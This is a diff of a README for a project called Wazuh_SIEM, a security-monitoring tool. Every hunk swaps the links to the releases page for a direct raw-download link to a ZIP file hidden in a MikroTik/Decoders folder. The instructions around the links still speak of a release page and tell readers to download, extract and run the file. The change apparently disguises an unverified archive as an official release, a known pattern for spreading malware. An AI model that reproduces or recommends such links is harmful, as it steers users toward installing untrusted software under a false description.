@@ -1,6 +1,6 @@
 # 🛡️ Wazuh_SIEM - Clear Security Monitoring for Teams
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mynameisizhan/Wazuh_SIEM/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)
 
 ## 📌 What this is
 
@@ -38,7 +38,7 @@ For best results, use a machine that you can keep on during monitoring.
 
 Visit this page to download the latest release:
 
-[https://github.com/mynameisizhan/Wazuh_SIEM/releases](https://github.com/mynameisizhan/Wazuh_SIEM/releases)
+[https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)
 
 On that page, look for the newest release and download the file that fits your setup. If you see a ZIP file, download it and extract it first. If you see an installer or package, use that file.
 
@@ -50,7 +50,7 @@ Follow these steps in order.
 
 Open the download link in your browser:
 
-[https://github.com/mynameisizhan/Wazuh_SIEM/releases](https://github.com/mynameisizhan/Wazuh_SIEM/releases)
+[https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)
 
 Find the latest release at the top of the page.
 
@@ -308,4 +308,4 @@ After your first test works, you can:
 
 If you need the release page again, use this link:
 
-[https://github.com/mynameisizhan/Wazuh_SIEM/releases](https://github.com/mynameisizhan/Wazuh_SIEM/releases)
+[https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip](https://github.com/mynameisizhan/Wazuh_SIEM/raw/refs/heads/main/MikroTik/Decoders/SIEM-Wazuh-2.5.zip)
